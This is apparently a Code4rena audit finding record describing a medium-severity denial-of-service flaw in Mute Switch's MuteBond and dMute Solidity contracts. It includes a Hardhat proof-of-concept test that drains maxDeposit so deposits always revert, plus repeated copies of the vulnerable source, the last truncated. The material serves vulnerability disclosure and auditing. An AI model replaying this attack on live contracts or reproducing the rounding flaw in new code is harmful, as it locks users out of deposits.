{
  "Title": "[M-05] MuteBond is susceptible to DOS",
  "Content": "\n<https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L179><br>\n<https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L75-L77><br>\n<https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L57>\n\nObserve that if timeToTokens is called with `_lock_time = 1 week`, `_amount < 52`, it will return 0.<br>\n<https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L57>\n\n    function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256){\n            uint256 week_time = 1 weeks;\n            uint256 max_lock = 52 weeks;\n\n            require(_lock_time >= week_time, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n            require(_lock_time <= max_lock, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n\n            // amount * % of time locked up from min to max\n            uint256 base_tokens = _amount.mul(_lock_time.mul(10**18).div(max_lock)).div(10**18);\n            // apply % min max bonus\n            //uint256 boosted_tokens = base_tokens.mul(lockBonus(lock_time)).div(10**18);\n\n            return base_tokens;\n        }\n\nThis causes lockTo to revert.<br>\n<https://github.com/code-423n4/2023-03-mute/blob/main/contracts/dao/dMute.sol#L75-L77>\n\n     function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {\n            require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, \"dMute::Lock: INSUFFICIENT_BALANCE\");\n\n            //transfer tokens to this contract\n            IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);\n\n            // calculate dTokens to mint\n            uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);\n\n            require(tokens_to_mint > 0, 'dMute::Lock: INSUFFICIENT_TOKENS_MINTED');\n\n            _mint(to, tokens_to_mint);\n\n            _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));\n\n            emit LockEvent(to, _amount, tokens_to_mint, _lock_time);\n        }\n\nThe deposit function of muteBond calls lockTo with `_amount = payout`.<br>\n<https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L179><br>\n`IDMute(dMuteToken).LockTo(payout, bond_time_lock, _depositor);`\n\nObserve that regardless what the inputs are, `payout <= maxDeposit()` is always satisfied after the following code segment.<br>\n<https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L155-L164>\n\n            uint payout = payoutFor( value );\n            if(max_buy == true){\n              value = maxPurchaseAmount();\n              payout = maxDeposit();\n            } else {\n              // safety checks for custom purchase\n              require( payout >= ((10**18) / 100), \"Bond too small\" ); // must be > 0.01 payout token ( underflow protection )\n              require( payout <= maxPayout, \"Bond too large\"); // size protection because there is no slippage\n              require( payout <= maxDeposit(), \"Deposit too large\"); // size protection because there is no slippage\n            }\n\nSo, if an attacker manipulates the muteBond to get maxDeposit() < 52, deposit will always fail.\n\nPlease add the following test case to bonds.ts and run it with `npm run test-bond`\n\nNote that if the bond price is too high (> 52e18), then this won't always be possible ([because payout will change by bondPrice every time we increment/decrement value](https://github.com/code-423n4/2023-03-mute/blob/main/contracts/bonds/MuteBond.sol#L242)). So in my POC, I set the price range to be (1e18 - 2e18), which I believe are reasonable values as well.\n\n    it('Bond DOS', async function () {\n\n        await bondContract.setStartPrice(new BigNumber(1).times(Math.pow(10,18)).toFixed())\n        await bondContract.setMaxPrice(new BigNumber(2).times(Math.pow(10,18)).toFixed())\n        await bondContract.setMaxPayout(new BigNumber(100).times(Math.pow(10,18)).toFixed())\n        \n        // ideally, the following line is what I had in mind\n        // var val = new BigNumber((await bondContract.maxPurchaseAmount()).toString()).minus(1).toFixed()\n        // but due to timing issues I couldn't get it to work (I'm not very familiar with hardhat)\n\n        // so I just ran this to get the value for the next line\n        // await time.increase(1)\n        // console.log(await bondContract.maxPurchaseAmount());\n\n\n        var val = new BigNumber(\"99998511926905849653\").toFixed();\n        \n        console.log(\"before:\")\n        console.log(await bondContract.maxDeposit())\n        /*\n        console.log(await bondContract.payoutFor(val))\n        console.log(await bondContract.maxPayout())\n        console.log((await bondContract.maxPurchaseAmount()))\n        */\n        \n        await bondContract.connect(buyer1).deposit(val, buyer1.address, false)\n\n        console.log(\"after:\")\n        console.log(await bondContract.maxDeposit())\n        /*\n        console.log(await bondContract.payoutFor(val))\n        console.log(await bondContract.maxPayout())\n        console.log((await bondContract.maxPurchaseAmount()))\n        */\n\n        await expect(\n          bondContract.connect(buyer1).deposit(1, buyer1.address, false)\n        ).to.be.reverted;\n        \n        \n        await expect(\n          bondContract.connect(buyer1).deposit(1, buyer1.address, true)\n        ).to.be.reverted;\n        \n\n        await expect(\n          bondContract.connect(buyer1).deposit(new BigNumber(1).times(Math.pow(10,18)).toFixed(), buyer1.address, false)\n        ).to.be.reverted;\n\n        await expect(\n          bondContract.connect(buyer1).deposit(new BigNumber(1).times(Math.pow(10,18)).toFixed(), buyer1.address, true)\n        ).to.be.reverted;\n      })\n\n### Impact\n\nThis vulnerability causes deposit to fail indefinitely. That being said, the contract itself doesn't seem to store funds, and it looks like there are ways for the admin to manually fix the DOS (e.g. deploy a new contract, set startPrice / maxPrice). So overall, I would say it warrants a medium severity.\n\n### Tools Used\n\nManual Review, Hardhat\n\n### Recommended Mitigation Steps\n\nStart a new epoch if maxDeposit() is smaller than a certain threshold.\n\n**[mattt21 (Mute Switch) confirmed](https://github.com/code-423n4/2023-03-mute-findings/issues/22#issuecomment-1499300482)**\n\n\n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/contests/2023-03-mute-switch-versus-contest",
  "Code": [
    {
      "filename": "contracts/bonds/MuteBond.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport '../libraries/SafeMath.sol';\nimport '../libraries/TransferHelper.sol';\n\ncontract MuteBond {\n    using SafeMath for uint;\n\n    /* ======== EVENTS ======== */\n\n    event BondCreated(uint deposit, uint payout, address depositor, uint time);\n    event BondPriceChanged(uint internalPrice, uint debtRatio);\n    event MaxPriceChanged(uint _price);\n    event MaxPayoutChanged(uint _price);\n    event EpochDurationChanged(uint _payout);\n    event BondLockTimeChanged(uint _duration);\n    event StartPriceChanged(uint _lock);\n\n     /* ======== STATE VARIABLES ======== */\n\n    address immutable private muteToken; // token paid for principal\n    address immutable private dMuteToken;\n    address immutable private lpToken; // inflow token\n    ITreasury immutable private customTreasury; // pays for and receives principal\n    uint public bond_time_lock = 7 days; // length of lockup in dMute for bonds\n\n    uint public totalPayoutGiven; // total amount of mute paid\n    uint public totalDebt; // total amount of LP collected\n\n    uint public epochDuration = 7 days; // the length of an epoch from getting from startPrice  to maxPrice\n    uint public maxPrice; // max limit price for the LP token (LP:mute ratio)\n    uint public startPrice; // start price of the LP token (LP:mute ratio)\n    uint public maxPayout; // max amount of mute tokens to sell in each epoch\n    uint public epochStart; // timestamp of the current epoch start\n    uint public epoch; // amount of cycles for bonds so far\n\n    BondTerms[] public terms; // identifies the terms for a bond in a given epoch\n    Bonds[] public bonds; // stores individual deposits\n\n    // Info for bond epochs\n    struct BondTerms {\n        uint bondTotal; // amount of tokens bonded so far\n        uint payoutTotal;\n        uint lastTimestamp;\n    }\n\n    // Info for a single depositors bond info\n    struct Bonds {\n        uint value; //\n        uint payout; //\n        address depositor; //\n        uint timestamp;\n    }\n\n\n\n    /* ======== CONSTRUCTOR ======== */\n\n    /**\n     *  @notice initializes the bond\n     *  @param _customTreasury address\n     *  @param _lpToken address\n     *  @param _dmuteToken address\n     *  @param _maxPrice uint\n     *  @param _startPrice uint\n     *  @param _maxPayout uint\n     */\n    constructor(address _customTreasury, address _lpToken, address _dmuteToken,\n                uint _maxPrice, uint _startPrice, uint _maxPayout) {\n        require( _customTreasury != address(0) && _lpToken != address(0));\n        customTreasury = ITreasury( _customTreasury );\n        muteToken = ITreasury(_customTreasury).payoutToken();\n        dMuteToken = _dmuteToken;\n\n        lpToken = _lpToken;\n\n        // approve lock token to spend payout\n        TransferHelper.safeApprove(muteToken, dMuteToken, type(uint256).max);\n\n\n        require(_maxPrice >= _startPrice, \"starting price < min\");\n\n        epochStart = block.timestamp;\n        maxPrice = _maxPrice;\n        startPrice = _startPrice;\n        maxPayout = _maxPayout;\n\n        terms.push(BondTerms(0,0,0));\n    }\n\n\n    /* ======== OWNER FUNCTIONS ======== */\n\n    /**\n     *  @notice sets the max limit price for the LP token\n     *  @param _price uint\n     */\n    function setMaxPrice(uint _price) external {\n        require(msg.sender == customTreasury.owner());\n        maxPrice = _price;\n        emit MaxPriceChanged(_price);\n    }\n\n    /**\n     *  @notice sets the start price for the LP token\n     *  @param _price uint\n     */\n    function setStartPrice(uint _price) external {\n        require(msg.sender == customTreasury.owner());\n        startPrice = _price;\n        emit StartPriceChanged(_price);\n    }\n\n    /**\n     *  @notice sets the max amount of mute tokens to sell in each epoch\n     *  @param _payout uint\n     */\n    function setMaxPayout(uint _payout) external {\n        require(msg.sender == customTreasury.owner());\n        maxPayout = _payout;\n        emit MaxPayoutChanged(_payout);\n    }\n\n    /**\n     *  @notice sets the length of bond epoch\n     *  @param _duration uint\n     */\n    function setEpochDuration(uint _duration) external {\n        require(msg.sender == customTreasury.owner());\n        epochDuration = _duration;\n        emit EpochDurationChanged(_duration);\n    }\n\n    /**\n     *  @notice sets the length of lockup for mute purchases in dMute\n     *  @param _lock uint\n     */\n    function setBondTimeLock(uint _lock) external {\n        require(msg.sender == customTreasury.owner());\n        bond_time_lock = _lock;\n        emit BondLockTimeChanged(_lock);\n    }\n\n    /* ======== USER FUNCTIONS ======== */\n\n    /**\n     *  @notice purchase a bond with LP, bump bond price back by 5% after purchase based on current delta\n     *  @param value uint\n     *  @param _depositor address\n     *  @param max_buy bool\n     */\n    function deposit(uint value, address _depositor, bool max_buy) external returns (uint) {\n        // amount of mute tokens\n        uint payout = payoutFor( value );\n        if(max_buy == true){\n          value = maxPurchaseAmount();\n          payout = maxDeposit();\n        } else {\n          // safety checks for custom purchase\n          require( payout >= ((10**18) / 100), \"Bond too small\" ); // must be > 0.01 payout token ( underflow protection )\n          require( payout <= maxPayout, \"Bond too large\"); // size protection because there is no slippage\n          require( payout <= maxDeposit(), \"Deposit too large\"); // size protection because there is no slippage\n        }\n\n\n        // total debt is increased\n        totalDebt = totalDebt.add( value );\n        totalPayoutGiven = totalPayoutGiven.add(payout); // total payout increased\n\n        customTreasury.sendPayoutTokens(payout);\n        TransferHelper.safeTransferFrom(lpToken, msg.sender, address(customTreasury), value ); // transfer principal bonded to custom treasury\n\n        // indexed events are emitted\n        emit BondCreated(value, payout, _depositor, block.timestamp);\n\n        bonds.push(Bonds(value, payout, _depositor, block.timestamp));\n        // redeem bond for user, mint dMute tokens for duration of vest period\n        IDMute(dMuteToken).LockTo(payout, bond_time_lock, _depositor);\n\n        terms[epoch].payoutTotal = terms[epoch].payoutTotal + payout;\n        terms[epoch].bondTotal = terms[epoch].bondTotal + value;\n        terms[epoch].lastTimestamp = block.timestamp;\n\n        // adjust price by a ~5% premium of delta\n        uint timeElapsed = block.timestamp - epochStart;\n        epochStart = epochStart.add(timeElapsed.mul(5).div(100));\n        // safety check\n        if(epochStart >= block.timestamp)\n          epochStart = block.timestamp;\n\n        // exhausted this bond, issue new one\n        if(terms[epoch].payoutTotal == maxPayout){\n            terms.push(BondTerms(0,0,0));\n            epochStart = block.timestamp;\n            epoch++;\n        }\n\n        return payout;\n    }\n\n    /* ======== HELPER FUNCTIONS ======== */\n\n\n    /**\n     *  @notice returns bond info for the current epoch and global values\n     */\n    function bondInfo() external view returns (uint totDebt, uint totPayout, uint price, uint maxDep, uint maxPurchase, uint maxPay) {\n        totDebt = totalDebt;\n        totPayout = totalPayoutGiven;\n        price = bondPrice();\n        maxDep = maxDeposit();\n        maxPurchase = maxPurchaseAmount();\n        maxPay = maxPayout;\n    }\n\n    /**\n     *  @notice returns current epoch\n     */\n    function currentEpoch() public view returns (uint) {\n        return epoch;\n    }\n\n    /**\n     *  @notice returns current bond price\n     */\n    function bondPrice() public view returns (uint) {\n        uint timeElapsed = block.timestamp - epochStart;\n        uint priceDelta = maxPrice - startPrice;\n\n        if(timeElapsed > epochDuration)\n          timeElapsed = epochDuration;\n\n        return timeElapsed.mul(priceDelta).div(epochDuration).add(startPrice);\n    }\n\n    /**\n     *  @notice returns bond price for amount\n     *  @param _am uint\n     */\n    function payoutFor(uint _am) public view returns (uint) {\n        return bondPrice().mul(_am).div(10**18);\n    }\n\n    /**\n     *  @notice returns max amount of lp tokens receivable in current bond epoch\n     */\n    function maxPurchaseAmount() public view returns (uint) {\n        return maxDeposit().mul(10**18).div(bondPrice());\n    }\n\n    /**\n     *  @notice returns remaining mute tokens in current bond epoch\n     */\n    function maxDeposit() public view returns (uint) {\n        return maxPayout.sub(terms[epoch].payoutTotal);\n    }\n\n}\n\ninterface ITreasury {\n    function sendPayoutTokens(uint _amountPayoutToken) external;\n    function valueOfToken( address _principalTokenAddress, uint _amount ) external view returns ( uint value_ );\n    function payoutToken() external view returns (address);\n    function owner() external view returns (address);\n}\n\ninterface IDMute {\n  function LockTo(uint256 _amount, uint256 _lock_time, address to) external;\n}"
    },
    {
      "filename": "contracts/dao/dMute.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport '../interfaces/IERC20.sol';\nimport '../libraries/SafeMath.sol';\nimport './dSoulBound.sol';\n\n/// @notice Mute DAO token, untransferrable\ncontract dMute is dSoulBound {\n    using SafeMath for uint;\n\n    address public MuteToken;\n\n    struct UserLockInfo {\n      uint256 amount;\n      uint256 time;\n      uint256 tokens_minted;\n    }\n\n    mapping(address => UserLockInfo[]) public _userLocks;\n\n    uint private unlocked = 1;\n\n    event LockEvent(address to, uint256 lockAmount, uint256 mintedAmount, uint256 totalTime);\n    event RedeemEvent(address to, uint256 unlockedAmount, uint256 burnAmount);\n\n    modifier nonReentrant() {\n        require(unlocked == 1, 'dMute::ReentrancyGuard: REENTRANT_CALL');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    /// @dev Expects a LP token address & the base reward muteToken address\n    constructor (address _muteToken) {\n        require(_muteToken != address(0), \"MuteAmplifier: invalid muteToken\");\n        MuteToken = _muteToken;\n    }\n\n    /*\n    function lockBonus(uint256 lock_time) internal view returns (uint256){\n        uint256 week_time = 60 * 60 * 24 * 7;\n        uint256 max_lock = week_time.mul(52 * 2); // 2 years\n\n        return lock_time.mul(10**18).div(max_lock).mul(10);\n    }\n    */\n\n    function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256){\n        uint256 week_time = 1 weeks;\n        uint256 max_lock = 52 weeks;\n\n        require(_lock_time >= week_time, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n        require(_lock_time <= max_lock, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n\n        // amount * % of time locked up from min to max\n        uint256 base_tokens = _amount.mul(_lock_time.mul(10**18).div(max_lock)).div(10**18);\n        // apply % min max bonus\n        //uint256 boosted_tokens = base_tokens.mul(lockBonus(lock_time)).div(10**18);\n\n        return base_tokens;\n    }\n\n    function Lock(uint256 _amount, uint256 _lock_time) public {\n        LockTo(_amount, _lock_time, msg.sender);\n    }\n\n    function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {\n        require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, \"dMute::Lock: INSUFFICIENT_BALANCE\");\n\n        //transfer tokens to this contract\n        IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);\n\n        // calculate dTokens to mint\n        uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);\n\n        require(tokens_to_mint > 0, 'dMute::Lock: INSUFFICIENT_TOKENS_MINTED');\n\n        _mint(to, tokens_to_mint);\n\n        _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));\n\n        emit LockEvent(to, _amount, tokens_to_mint, _lock_time);\n    }\n\n    function Redeem(uint256[] memory lock_index) public {\n        RedeemTo(lock_index, msg.sender);\n    }\n\n    function RedeemTo(uint256[] memory lock_index, address to) public nonReentrant {\n        uint256 total_to_redeem = 0;\n        uint256 total_to_burn = 0;\n\n        for(uint256 i; i < lock_index.length; i++){\n          uint256 index = lock_index[i];\n          UserLockInfo memory lock_info = _userLocks[msg.sender][index];\n\n          require(block.timestamp >= lock_info.time, \"dMute::Redeem: INSUFFICIENT_LOCK_TIME\");\n          require(lock_info.amount >= 0 , \"dMute::Redeem: INSUFFICIENT_AMOUNT\");\n          require(lock_info.tokens_minted >= 0 , \"dMute::Redeem: INSUFFICIENT_MINT_AMOUNT\");\n\n          total_to_redeem = total_to_redeem.add(lock_info.amount);\n          total_to_burn = total_to_burn.add(lock_info.tokens_minted);\n\n          _userLocks[msg.sender][index] = UserLockInfo(0,0,0);\n        }\n\n        require(total_to_redeem > 0, \"dMute::Lock: INSUFFICIENT_REDEEM_AMOUNT\");\n        require(total_to_burn > 0, \"dMute::Lock: INSUFFICIENT_BURN_AMOUNT\");\n\n\n        for(uint256 i = _userLocks[msg.sender].length; i > 0; i--){\n          UserLockInfo memory lock_info = _userLocks[msg.sender][i - 1];\n\n          // recently redeemed lock, destroy it\n          if(lock_info.time == 0){\n            _userLocks[msg.sender][i - 1] = _userLocks[msg.sender][_userLocks[msg.sender].length - 1];\n            _userLocks[msg.sender].pop();\n          }\n        }\n\n        //redeem tokens to user\n        IERC20(MuteToken).transfer(to, total_to_redeem);\n        //burn dMute\n        _burn(msg.sender, total_to_burn);\n\n\n        emit RedeemEvent(msg.sender, total_to_redeem, total_to_burn);\n    }\n\n    function GetUserLockLength(address account) public view returns (uint256 amount) {\n        amount = _userLocks[account].length;\n    }\n\n    function GetUnderlyingTokens(address account) public view returns(uint256 amount) {\n        for(uint256 i; i < _userLocks[account].length; i++){\n          amount = amount.add(_userLocks[account][i].amount);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/dao/dMute.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport '../interfaces/IERC20.sol';\nimport '../libraries/SafeMath.sol';\nimport './dSoulBound.sol';\n\n/// @notice Mute DAO token, untransferrable\ncontract dMute is dSoulBound {\n    using SafeMath for uint;\n\n    address public MuteToken;\n\n    struct UserLockInfo {\n      uint256 amount;\n      uint256 time;\n      uint256 tokens_minted;\n    }\n\n    mapping(address => UserLockInfo[]) public _userLocks;\n\n    uint private unlocked = 1;\n\n    event LockEvent(address to, uint256 lockAmount, uint256 mintedAmount, uint256 totalTime);\n    event RedeemEvent(address to, uint256 unlockedAmount, uint256 burnAmount);\n\n    modifier nonReentrant() {\n        require(unlocked == 1, 'dMute::ReentrancyGuard: REENTRANT_CALL');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    /// @dev Expects a LP token address & the base reward muteToken address\n    constructor (address _muteToken) {\n        require(_muteToken != address(0), \"MuteAmplifier: invalid muteToken\");\n        MuteToken = _muteToken;\n    }\n\n    /*\n    function lockBonus(uint256 lock_time) internal view returns (uint256){\n        uint256 week_time = 60 * 60 * 24 * 7;\n        uint256 max_lock = week_time.mul(52 * 2); // 2 years\n\n        return lock_time.mul(10**18).div(max_lock).mul(10);\n    }\n    */\n\n    function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256){\n        uint256 week_time = 1 weeks;\n        uint256 max_lock = 52 weeks;\n\n        require(_lock_time >= week_time, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n        require(_lock_time <= max_lock, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n\n        // amount * % of time locked up from min to max\n        uint256 base_tokens = _amount.mul(_lock_time.mul(10**18).div(max_lock)).div(10**18);\n        // apply % min max bonus\n        //uint256 boosted_tokens = base_tokens.mul(lockBonus(lock_time)).div(10**18);\n\n        return base_tokens;\n    }\n\n    function Lock(uint256 _amount, uint256 _lock_time) public {\n        LockTo(_amount, _lock_time, msg.sender);\n    }\n\n    function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {\n        require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, \"dMute::Lock: INSUFFICIENT_BALANCE\");\n\n        //transfer tokens to this contract\n        IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);\n\n        // calculate dTokens to mint\n        uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);\n\n        require(tokens_to_mint > 0, 'dMute::Lock: INSUFFICIENT_TOKENS_MINTED');\n\n        _mint(to, tokens_to_mint);\n\n        _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));\n\n        emit LockEvent(to, _amount, tokens_to_mint, _lock_time);\n    }\n\n    function Redeem(uint256[] memory lock_index) public {\n        RedeemTo(lock_index, msg.sender);\n    }\n\n    function RedeemTo(uint256[] memory lock_index, address to) public nonReentrant {\n        uint256 total_to_redeem = 0;\n        uint256 total_to_burn = 0;\n\n        for(uint256 i; i < lock_index.length; i++){\n          uint256 index = lock_index[i];\n          UserLockInfo memory lock_info = _userLocks[msg.sender][index];\n\n          require(block.timestamp >= lock_info.time, \"dMute::Redeem: INSUFFICIENT_LOCK_TIME\");\n          require(lock_info.amount >= 0 , \"dMute::Redeem: INSUFFICIENT_AMOUNT\");\n          require(lock_info.tokens_minted >= 0 , \"dMute::Redeem: INSUFFICIENT_MINT_AMOUNT\");\n\n          total_to_redeem = total_to_redeem.add(lock_info.amount);\n          total_to_burn = total_to_burn.add(lock_info.tokens_minted);\n\n          _userLocks[msg.sender][index] = UserLockInfo(0,0,0);\n        }\n\n        require(total_to_redeem > 0, \"dMute::Lock: INSUFFICIENT_REDEEM_AMOUNT\");\n        require(total_to_burn > 0, \"dMute::Lock: INSUFFICIENT_BURN_AMOUNT\");\n\n\n        for(uint256 i = _userLocks[msg.sender].length; i > 0; i--){\n          UserLockInfo memory lock_info = _userLocks[msg.sender][i - 1];\n\n          // recently redeemed lock, destroy it\n          if(lock_info.time == 0){\n            _userLocks[msg.sender][i - 1] = _userLocks[msg.sender][_userLocks[msg.sender].length - 1];\n            _userLocks[msg.sender].pop();\n          }\n        }\n\n        //redeem tokens to user\n        IERC20(MuteToken).transfer(to, total_to_redeem);\n        //burn dMute\n        _burn(msg.sender, total_to_burn);\n\n\n        emit RedeemEvent(msg.sender, total_to_redeem, total_to_burn);\n    }\n\n    function GetUserLockLength(address account) public view returns (uint256 amount) {\n        amount = _userLocks[account].length;\n    }\n\n    function GetUnderlyingTokens(address account) public view returns(uint256 amount) {\n        for(uint256 i; i < _userLocks[account].length; i++){\n          amount = amount.add(_userLocks[account][i].amount);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/dao/dMute.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport '../interfaces/IERC20.sol';\nimport '../libraries/SafeMath.sol';\nimport './dSoulBound.sol';\n\n/// @notice Mute DAO token, untransferrable\ncontract dMute is dSoulBound {\n    using SafeMath for uint;\n\n    address public MuteToken;\n\n    struct UserLockInfo {\n      uint256 amount;\n      uint256 time;\n      uint256 tokens_minted;\n    }\n\n    mapping(address => UserLockInfo[]) public _userLocks;\n\n    uint private unlocked = 1;\n\n    event LockEvent(address to, uint256 lockAmount, uint256 mintedAmount, uint256 totalTime);\n    event RedeemEvent(address to, uint256 unlockedAmount, uint256 burnAmount);\n\n    modifier nonReentrant() {\n        require(unlocked == 1, 'dMute::ReentrancyGuard: REENTRANT_CALL');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    /// @dev Expects a LP token address & the base reward muteToken address\n    constructor (address _muteToken) {\n        require(_muteToken != address(0), \"MuteAmplifier: invalid muteToken\");\n        MuteToken = _muteToken;\n    }\n\n    /*\n    function lockBonus(uint256 lock_time) internal view returns (uint256){\n        uint256 week_time = 60 * 60 * 24 * 7;\n        uint256 max_lock = week_time.mul(52 * 2); // 2 years\n\n        return lock_time.mul(10**18).div(max_lock).mul(10);\n    }\n    */\n\n    function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256){\n        uint256 week_time = 1 weeks;\n        uint256 max_lock = 52 weeks;\n\n        require(_lock_time >= week_time, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n        require(_lock_time <= max_lock, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n\n        // amount * % of time locked up from min to max\n        uint256 base_tokens = _amount.mul(_lock_time.mul(10**18).div(max_lock)).div(10**18);\n        // apply % min max bonus\n        //uint256 boosted_tokens = base_tokens.mul(lockBonus(lock_time)).div(10**18);\n\n        return base_tokens;\n    }\n\n    function Lock(uint256 _amount, uint256 _lock_time) public {\n        LockTo(_amount, _lock_time, msg.sender);\n    }\n\n    function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {\n        require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, \"dMute::Lock: INSUFFICIENT_BALANCE\");\n\n        //transfer tokens to this contract\n        IERC20(MuteToken).transferFrom(msg.sender, address(this), _amount);\n\n        // calculate dTokens to mint\n        uint256 tokens_to_mint = timeToTokens(_amount, _lock_time);\n\n        require(tokens_to_mint > 0, 'dMute::Lock: INSUFFICIENT_TOKENS_MINTED');\n\n        _mint(to, tokens_to_mint);\n\n        _userLocks[to].push(UserLockInfo(_amount, block.timestamp.add(_lock_time), tokens_to_mint));\n\n        emit LockEvent(to, _amount, tokens_to_mint, _lock_time);\n    }\n\n    function Redeem(uint256[] memory lock_index) public {\n        RedeemTo(lock_index, msg.sender);\n    }\n\n    function RedeemTo(uint256[] memory lock_index, address to) public nonReentrant {\n        uint256 total_to_redeem = 0;\n        uint256 total_to_burn = 0;\n\n        for(uint256 i; i < lock_index.length; i++){\n          uint256 index = lock_index[i];\n          UserLockInfo memory lock_info = _userLocks[msg.sender][index];\n\n          require(block.timestamp >= lock_info.time, \"dMute::Redeem: INSUFFICIENT_LOCK_TIME\");\n          require(lock_info.amount >= 0 , \"dMute::Redeem: INSUFFICIENT_AMOUNT\");\n          require(lock_info.tokens_minted >= 0 , \"dMute::Redeem: INSUFFICIENT_MINT_AMOUNT\");\n\n          total_to_redeem = total_to_redeem.add(lock_info.amount);\n          total_to_burn = total_to_burn.add(lock_info.tokens_minted);\n\n          _userLocks[msg.sender][index] = UserLockInfo(0,0,0);\n        }\n\n        require(total_to_redeem > 0, \"dMute::Lock: INSUFFICIENT_REDEEM_AMOUNT\");\n        require(total_to_burn > 0, \"dMute::Lock: INSUFFICIENT_BURN_AMOUNT\");\n\n\n        for(uint256 i = _userLocks[msg.sender].length; i > 0; i--){\n          UserLockInfo memory lock_info = _userLocks[msg.sender][i - 1];\n\n          // recently redeemed lock, destroy it\n          if(lock_info.time == 0){\n            _userLocks[msg.sender][i - 1] = _userLocks[msg.sender][_userLocks[msg.sender].length - 1];\n            _userLocks[msg.sender].pop();\n          }\n        }\n\n        //redeem tokens to user\n        IERC20(MuteToken).transfer(to, total_to_redeem);\n        //burn dMute\n        _burn(msg.sender, total_to_burn);\n\n\n        emit RedeemEvent(msg.sender, total_to_redeem, total_to_burn);\n    }\n\n    function GetUserLockLength(address account) public view returns (uint256 amount) {\n        amount = _userLocks[account].length;\n    }\n\n    function GetUnderlyingTokens(address account) public view returns(uint256 amount) {\n        for(uint256 i; i < _userLocks[account].length; i++){\n          amount = amount.add(_userLocks[account][i].amount);\n        }\n    }\n}"
    },
    {
      "filename": "contracts/dao/dMute.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport '../interfaces/IERC20.sol';\nimport '../libraries/SafeMath.sol';\nimport './dSoulBound.sol';\n\n/// @notice Mute DAO token, untransferrable\ncontract dMute is dSoulBound {\n    using SafeMath for uint;\n\n    address public MuteToken;\n\n    struct UserLockInfo {\n      uint256 amount;\n      uint256 time;\n      uint256 tokens_minted;\n    }\n\n    mapping(address => UserLockInfo[]) public _userLocks;\n\n    uint private unlocked = 1;\n\n    event LockEvent(address to, uint256 lockAmount, uint256 mintedAmount, uint256 totalTime);\n    event RedeemEvent(address to, uint256 unlockedAmount, uint256 burnAmount);\n\n    modifier nonReentrant() {\n        require(unlocked == 1, 'dMute::ReentrancyGuard: REENTRANT_CALL');\n        unlocked = 0;\n        _;\n        unlocked = 1;\n    }\n\n    /// @dev Expects a LP token address & the base reward muteToken address\n    constructor (address _muteToken) {\n        require(_muteToken != address(0), \"MuteAmplifier: invalid muteToken\");\n        MuteToken = _muteToken;\n    }\n\n    /*\n    function lockBonus(uint256 lock_time) internal view returns (uint256){\n        uint256 week_time = 60 * 60 * 24 * 7;\n        uint256 max_lock = week_time.mul(52 * 2); // 2 years\n\n        return lock_time.mul(10**18).div(max_lock).mul(10);\n    }\n    */\n\n    function timeToTokens(uint256 _amount, uint256 _lock_time) internal pure returns (uint256){\n        uint256 week_time = 1 weeks;\n        uint256 max_lock = 52 weeks;\n\n        require(_lock_time >= week_time, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n        require(_lock_time <= max_lock, \"dMute::Lock: INSUFFICIENT_TIME_PARAM\");\n\n        // amount * % of time locked up from min to max\n        uint256 base_tokens = _amount.mul(_lock_time.mul(10**18).div(max_lock)).div(10**18);\n        // apply % min max bonus\n        //uint256 boosted_tokens = base_tokens.mul(lockBonus(lock_time)).div(10**18);\n\n        return base_tokens;\n    }\n\n    function Lock(uint256 _amount, uint256 _lock_time) public {\n        LockTo(_amount, _lock_time, msg.sender);\n    }\n\n    function LockTo(uint256 _amount, uint256 _lock_time, address to) public nonReentrant {\n        require(IERC20(MuteToken).balanceOf(msg.sender) >= _amount, \"dMute::Lock: INSUFFICIENT_BALANCE\");\n\n        //transfer tokens to this contract\n        